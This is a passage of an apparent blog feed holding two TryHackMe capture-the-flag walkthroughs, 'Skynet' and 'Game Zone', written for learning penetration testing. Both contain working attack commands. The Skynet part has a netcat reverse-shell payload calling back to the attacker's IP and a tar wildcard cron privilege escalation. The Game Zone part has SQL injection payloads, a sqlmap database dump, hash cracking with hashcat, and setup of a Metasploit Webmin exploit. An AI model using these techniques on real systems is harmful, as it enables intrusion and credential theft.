load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ whoami www-data $ I stabilize the shell $ python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)' www-data@skynet:/usr$ export TERM=xterm export TERM=xterm www-data@skynet:/usr$ stty raw -echo; fg stty raw -echo; fg bash: fg: current: no such job www-data@skynet:/usr$ And get the flag www-data@skynet:/$ ls bin home lib64 opt sbin tmp vmlinuz.old boot initrd.img lost+found proc snap usr dev initrd.img.old media root srv var etc lib mnt run sys vmlinuz www-data@skynet:/$ cd home www-data@skynet:/home$ ls milesdyson www-data@skynet:/home$ cd milesdyson www-data@skynet:/home/milesdyson$ ls backups mail share user.txt www-data@skynet:/home/milesdyson$ cat user.txt xxxe5c2109a40f95809xxxxxxx www-data@skynet:/home/milesdyson$ Escalation We are currently running under the www-data account. Using the password we found earlier I can change to the milesdyson account but that doesn’t help us right now. www-data@skynet:/home/milesdyson$ su milesdyson Password: cyborg007haloterminator milesdyson@skynet: I checked to see if there were any cron jobs running and found one called backup.sh that ran every minute www-data@skynet:/home/milesdyson$ cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command */1 * * * * root /home/milesdyson/backups/backup.sh 17 * * * * root cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.monthly ) # www-data@skynet:/home/milesdyson$ Unfortunately, this is running under root. Looking at the script I see this. www-data@skynet:/home/milesdyson/backups$ cat backup.sh #!/bin/bash cd /var/www/html tar cf /home/milesdyson/backups/backup.tgz * www-data@skynet:/home/milesdyson/backups$ Brick Wall After trying many things, I hit a brick wall and was stuck so I had to resort to trying to find a hint on the web. It was this research that led me to this walktough on YouTube by John Hammond which highlighted a technique, tar wildcard injection which can be read about on this site. Escalation (Resumed) I created reverse netcat shellcode using msfvenom (dspo6㉿kali)[~/pentest/pentest_utils/shells]$ msfvenom -p cmd/unix/reverse_netcat lhost=10.2.2.175 lport=8888 R [-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload [-] No arch selected, selecting arch: cmd from the payload No encoder specified, outputting raw payload Payload size: 88 bytes mkfifo /tmp/pbwq; nc 10.2.2.175 8888 0&amp;lt;/tmp/pbwq | /bin/sh &amp;gt;/tmp/pbwq 2&amp;gt;&amp;amp;1; rm /tmp/pbwq (dspo6㉿kali)[~/pentest/pentest_utils/shells]$ I then created a script on the target using this shellcode and copied it to the folder being backup by the cron job. www-data@skynet:/dev/shm$ echo &quot;mkfifo /tmp/pbwq; nc 10.2.2.175 8888 0&amp;lt;/tmp/pbwq | /bin/sh &amp;gt;/tmp/pbwq 2&amp;gt;&amp;amp;1; rm /tmp/pbwq &amp;gt; &quot; &amp;gt; shell.sh www-data@skynet:/dev/shm$ www-data@skynet:/dev/shm$ cp shell.sh /var/www/html I then ran through the steps indicated on the tar wildcard page and waited for the backup cron job to run. www-data@skynet:/dev/shm$ cp --checkpoint=1 /var/www/html cp: unrecognized option '--checkpoint=1' Try 'cp --help' for more information. www-data@skynet:/dev/shm$ cd /var/www/html www-data@skynet:/var/www/html$ echo &quot;&quot; &amp;gt; &quot;--checkpoint-action=exec=sh shell.sh&quot; Shell acheived. (dspo6㉿kali)[~]$ nc -nvlp 8888 listening on [any] 8888 ... connect to [10.2.2.175] from (UNKNOWN) [10.10.184.206] 55396 ls 45kra24zxs28v3yd admin ai --checkpoint-action=exec=sh shell.sh config css image.png index.html js shell.sh style.css cd .. ls html cd .. cd /root ls root.txt cat root.txt XXX4753accc7179a282XXX Note: the tar wildcard exploit says that there is one more command but I got a shell before I executed it. echo &quot;&quot; &amp;gt; --checkpoint=1 Conclusion The first half of owning this box was fun but it was frustrating to have to resort to checking other walkthroughs to make progress at the escalation part. Since I am still learning these techniques, maybe it is not all that bad. I found out about something new and maybe I will be able to use this knowledge in the future.</summary></entry><entry><title type="html">Tryhackme Walkthough - Game Zone</title><link href="http://localhost:4000/tryhackme/2021/02/21/tryhackme-game-zone.html" rel="alternate" type="text/html" title="Tryhackme Walkthough - Game Zone" /><published>2021-02-21T09:16:14-08:00</published><updated>2021-02-21T09:16:14-08:00</updated><id>http://localhost:4000/tryhackme/2021/02/21/tryhackme-game-zone</id><content type="html" xml:base="http://localhost:4000/tryhackme/2021/02/21/tryhackme-game-zone.html">&lt;p&gt;This is a walkthrough of the Tryhackme room called “Game Zone”.&lt;/p&gt;

&lt;p&gt;Ths description of this room states&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;This room will cover SQLi (exploiting this vulnerability manually and via SQLMap), cracking a users hashed password, using SSH tunnels to reveal a hidden service and using a metasploit payload to gain root privileges.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This THM room doesn’t ask to run NMap scans or any of the initial enumeration so we will start by going directly to the site.&lt;/p&gt;

&lt;h2 id=&quot;the-game-zone-website&quot;&gt;The Game Zone Website&lt;/h2&gt;

&lt;p&gt;Navigating to the site in a browser, we see a website called Game Zone.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/2021-02-21_9-13-48.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There is a User Login panel on the left side so this looks like a good place to attack so we try to login as admin.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The room says that the site doesn’t have any user called admin but the above query works and brings you to a portal page at portal.php.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/2021-02-21_9-23-43.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;using-sqlmap&quot;&gt;Using SQLMap&lt;/h2&gt;

&lt;p&gt;The next thing to do is to dump the SQL database using SQLMap.&lt;/p&gt;

&lt;p&gt;The room directs you to intercept a search request using BurpSuite which is what I did and got back the following.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /portal.php HTTP/1.1
Host: 10.10.108.67
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 17
Origin: http://10.10.108.67
Connection: close
Referer: http://10.10.108.67/portal.php
Cookie: PHPSESSID=suepevsj6e11r9tko2ggj5q8q5
Upgrade-Insecure-Requests: 1

searchitem=testing
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This was then saved to a file called sqlrequest.txt.&lt;/p&gt;

&lt;p&gt;By the way, it is also possible to view the request using the developer tools in Firefox from the Network tab.&lt;/p&gt;

&lt;p&gt;After capturing the request, we then feed this into SQLmap&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -r sqlrequest.txt -dbms mysql -dump
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;where&lt;/p&gt;

&lt;p&gt;-r : use the intercepted request&lt;/p&gt;

&lt;p&gt;-dbms : what database we are dealing with&lt;/p&gt;

&lt;p&gt;-dump : dump the entire database.&lt;/p&gt;

&lt;p&gt;This yields the following&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(dspo6㉿kali)[~/pentest/boxes/thm/game_zone]$ sqlmap -r sqlrequest.txt -dbms mysql -dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.5#stable}
|_ -| . [&quot;]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:49:55 /2021-02-19/

[10:49:55] [INFO] parsing HTTP request from 'sqlrequest.txt'
[10:49:55] [INFO] testing connection to the target URL
[10:49:55] [INFO] testing if the target URL content is stable
[10:49:55] [INFO] target URL content is stable
[10:49:55] [INFO] testing if POST parameter 'searchitem' is dynamic
[10:49:56] [WARNING] POST parameter 'searchitem' does not appear to be dynamic
[10:49:56] [INFO] heuristic (basic) test shows that POST parameter 'searchitem' might be injectable (possible DBMS: 'MySQL')
[10:49:56] [INFO] heuristic (XSS) test shows that POST parameter 'searchitem' might be vulnerable to cross-site scripting (XSS) attacks
[10:49:56] [INFO] testing for SQL injection on POST parameter 'searchitem'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[10:50:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:50:02] [WARNING] reflective value(s) found and filtering out
[10:50:04] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:50:04] [INFO] testing 'Generic inline queries'
[10:50:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[10:50:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[10:50:16] [INFO] POST parameter 'searchitem' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --string=&quot;be&quot;)
[10:50:16] [INFO] testing 'MySQL &amp;gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[10:50:16] [INFO] testing 'MySQL &amp;gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[10:50:16] [INFO] testing 'MySQL &amp;gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[10:50:17] [INFO] testing 'MySQL &amp;gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[10:50:17] [INFO] testing 'MySQL &amp;gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[10:50:17] [INFO] POST parameter 'searchitem' is 'MySQL &amp;gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[10:50:17] [INFO] testing 'MySQL inline queries'
[10:50:17] [INFO] testing 'MySQL &amp;gt;= 5.0.12 stacked queries (comment)'
[10:50:18] [INFO] testing 'MySQL &amp;gt;= 5.0.12 stacked queries'
[10:50:18] [INFO] testing 'MySQL &amp;gt;= 5.0.12 stacked queries (query SLEEP - comment)'
[10:50:18] [INFO] testing 'MySQL &amp;gt;= 5.0.12 stacked queries (query SLEEP)'
[10:50:19] [INFO] testing 'MySQL &amp;lt; 5.0.12 stacked queries (heavy query - comment)'
[10:50:19] [INFO] testing 'MySQL &amp;lt; 5.0.12 stacked queries (heavy query)'
[10:50:19] [INFO] testing 'MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP)'
[10:50:30] [INFO] POST parameter 'searchitem' appears to be 'MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[10:50:30] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:50:30] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[10:50:30] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:50:30] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[10:50:31] [INFO] target URL appears to have 3 columns in query
[10:50:32] [INFO] POST parameter 'searchitem' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[10:50:32] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
---
Parameter: searchitem (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchitem=-2828' OR 2751=2751#

    Type: error-based
    Title: MySQL &amp;gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: searchitem=tester' AND GTID_SUBSET(CONCAT(0x7171627071,(SELECT (ELT(4754=4754,1))),0x717a627071),4754)-- bmCD

    Type: time-based blind
    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchitem=tester' AND (SELECT 6499 FROM (SELECT(SLEEP(5)))RNqx)-- KlSE

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: searchitem=tester' UNION ALL SELECT NULL,NULL,CONCAT(0x7171627071,0x724f745778686f5371736d525645714c44466567514b48564d4f4a775564714875434e5956455964,0x717a627071)#
---
[10:51:33] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL &amp;gt;= 5.6
[10:51:34] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[10:51:34] [INFO] fetching current database
[10:51:35] [INFO] fetching tables for database: 'db'
[10:51:35] [INFO] fetching columns for table 'users' in database 'db'
[10:51:35] [INFO] fetching entries for table 'users' in database 'db'
[10:51:35] [INFO] recognized possible password hashes in column 'pwd'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[10:51:44] [INFO] writing hashes to a temporary file '/tmp/sqlmapg3savr7s11905/sqlmaphashes-g6au1jcb.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] 
[10:51:49] [INFO] using hash method 'sha256_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
&amp;gt; 
[10:51:56] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] 
[10:52:01] [INFO] starting dictionary-based cracking (sha256_generic_passwd)
[10:52:01] [INFO] starting 4 processes 
[10:52:10] [WARNING] no clear password(s) found                                                                                                           
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

[10:52:10] [INFO] table 'db.users' dumped to CSV file '/home/dspo6/.local/share/sqlmap/output/10.10.108.67/dump/db/users.csv'
[10:52:10] [INFO] fetching columns for table 'post' in database 'db'
[10:52:10] [INFO] fetching entries for table 'post' in database 'db'
Database: db
Table: post
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                            |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

[10:52:10] [INFO] table 'db.post' dumped to CSV file '/home/dspo6/.local/share/sqlmap/output/10.10.108.67/dump/db/post.csv'
[10:52:10] [INFO] fetched data logged to text files under '/home/dspo6/.local/share/sqlmap/output/10.10.108.67'

[*] ending @ 10:52:10 /2021-02-19/

(dspo6㉿kali)[~/pentest/boxes/thm/game_zone]$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;b 19 10:52 ..
-rw-r--r-- 1 dspo6 dspo6  823 Feb 19 10:52 post.csv
-rw-r--r-- 1 dspo6 dspo6   87 Feb 19 10:52 users.csv
(dspo6㉿kali)[~/.local/share/sqlmap/output/10.10.108.67/dump/db]$ cat users.csv 
pwd,username
ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14,agent47

(dspo6㉿kali)[~/.local/share/sqlmap/output/10.10.108.67/dump/db]$ 

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Of interest to us here is this section which shows us the users table along with the password hash.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;hashcat&quot;&gt;Hashcat&lt;/h2&gt;

&lt;p&gt;I switched over to my Windows PC to crack this hash so I could take advantage of the GPU using the rockyou word list (although the output indicates that I need to update the CUDA SDK on my PC).&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS D:\Google Drive\Cyber Security\Utils\hashcat-6.1.1&amp;gt; .\hashcat.exe -a 0 -m 1400 .\target\hash.txt ..\wordlists\rockyouhashcat (v6.1.1) starting...

* Device #1: CUDA SDK Toolkit installation NOT detected.
             CUDA SDK Toolkit installation required for proper device support and utilization
             Falling back to OpenCL Runtime

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause &quot;CL_OUT_OF_RESOURCES&quot; or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
OpenCL API (OpenCL 1.2 CUDA 11.2.109) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #1: GeForce GTX 1070, 6720/8192 MB (2048 MB allocatable), 15MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 327 MB

Dictionary cache hit:
* Filename..: ..\wordlists\rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14:videogamer124

Session..........: hashcat
Status...........: Cracked
Hash.Name........: SHA2-256
Hash.Target......: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218...3efd14
Time.Started.....: Fri Feb 19 08:31:10 2021 (1 sec)
Time.Estimated...: Fri Feb 19 08:31:11 2021 (0 secs)
Guess.Base.......: File (..\wordlists\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 21318.5 kH/s (5.41ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2949120/14344385 (20.56%)
Rejected.........: 0/2949120 (0.00%)
Restore.Point....: 1966080/14344385 (13.71%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: bragg426 -&amp;gt; vaireva
Hardware.Mon.#1..: Temp: 35c Fan:  0% Util:  5% Core:1759MHz Mem:3802MHz Bus:16

Started: Fri Feb 19 08:31:08 2021
Stopped: Fri Feb 19 08:31:11 2021
PS D:\Google Drive\Cyber Security\Utils\hashcat-6.1.1&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So this shows that the password is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;videogamer124&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;using-found-credentials-with-ssh&quot;&gt;Using Found Credentials with SSH&lt;/h2&gt;

&lt;p&gt;We will now try the found credentials to log in using SSH and they work.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(dspo6㉿kali)[~/pentest/boxes/thm/game_zone]$ ssh agent47@10.10.108.67
The authenticity of host '10.10.108.67 (10.10.108.67)' can't be established.
ECDSA key fingerprint is SHA256:mpNHvzp9GPoOcwmWV/TMXiGwcqLIsVXDp5DvW26MFi8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.108.67' (ECDSA) to the list of known hosts.
agent47@10.10.108.67's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ss&lt;/code&gt; command to dump socket statistics, we see the following:-&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;agent47@gamezone:~$ ss -tulpn
Netid State      Recv-Q Send-Q                              Local Address:Port                                             Peer Address:Port              
udp   UNCONN     0      0                                               *:10000                                                       *:*                  
udp   UNCONN     0      0                                               *:68                                                          *:*                  
tcp   LISTEN     0      128                                             *:22                                                          *:*                  
tcp   LISTEN     0      80                                      127.0.0.1:3306                                                        *:*                  
tcp   LISTEN     0      128                                             *:10000                                                       *:*                  
tcp   LISTEN     0      128                                            :::22                                                         :::*                  
tcp   LISTEN     0      128                                            :::80                                                         :::*                  
agent47@gamezone:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note that there is a TCP port 10000 open.&lt;/p&gt;

&lt;p&gt;One thing that I do not understand about this room is the following statement:-&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list).&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I was unable to run the iptables command when logged in as agent47, presumably because that user is not root. In any case we will continue and exploit this port using an SSH tunnel.&lt;/p&gt;

&lt;h2 id=&quot;ssh-tunnel&quot;&gt;SSH Tunnel&lt;/h2&gt;

&lt;p&gt;Creating an SSH tunnel, will allow us to forward traffic on the port 10000 to a port on our PC.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(dspo6㉿kali)[~]$ ssh -L 10000:localhost:10000 agent47@10.10.27.3
The authenticity of host '10.10.27.3 (10.10.27.3)' can't be established.
ECDSA key fingerprint is SHA256:mpNHvzp9GPoOcwmWV/TMXiGwcqLIsVXDp5DvW26MFi8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.27.3' (ECDSA) to the list of known hosts.
agent47@10.10.27.3's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Sat Feb 20 16:57:39 2021 from 10.2.2.175
agent47@gamezone:~$ 

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Now when we go to our browser and navigate to the site with port 10000 we see a login page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/2021-02-22_6-20-43.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; The first few times, I tried this I was not able to view this page. It turned out that I still have the proxy for Burpsuite enabled in the browser - lesson learned.&lt;/p&gt;

&lt;p&gt;Logging in with the credentials we found earlier, we are brought to a Webmin version 1.580 page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2021-02-22_6-28-11.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;escalation&quot;&gt;Escalation&lt;/h2&gt;

&lt;p&gt;Search the Exploit DB, we find &lt;a href=&quot;https://www.exploit-db.com/exploits/21851&quot;&gt;CVE-2012-2982&lt;/a&gt; which turns out to be a Metasploit exploit.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; During this phase, we need to leaave the tunnel open.&lt;/p&gt;

&lt;p&gt;Firing up Metasploit, we can search for “CVE-2012-2982” and then use the resulting exploit. We then need to choose the payload of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmd/unix/reverse&lt;/code&gt; and enter the options.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf6 exploit(unix/webapp/webmin_show_cgi_exec) &amp;gt; show options

Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  videogamer124    yes       Webmin Password
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    localhost        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
   RPORT     10000            yes       The target port (TCP)
   SSL       true             yes       Use SSL
   USERNAME  agent47          yes       Webmin Username
   VHOST                      no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.2.2.175       yes       The listen address (an interface may be specified)
   LPORT  9002             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin 1.580


msf6 exploit(unix/webapp/webmin_show_cgi_exec) &amp;gt; 

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first time I ran this, the exploit failed&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf6 exploit(unix/webapp/webmin_show_cgi_exec) &amp;gt; run
[*] Exploiting target 0.0.0.1

[*] Started reverse TCP double handler on 10.2.2.175:9002 
[*] Attempting to login...
[-] Authentication failed
[*] Exploiting target 127.0.0.1
[*] Started reverse TCP double handler on 10.2.2.175:9002 
[*] Attempting to login...
[-] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=error: wrong version number
[*] Exploit completed, but no session was created.
msf6 exploit(unix/webapp/webmin_show_cgi_exec) &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The reason for this is that I had the SSL option set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;. I set this to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt; and tried again.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf6 exploit(unix/webapp/webmin_show_cgi_exec) &amp;gt; show options

Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
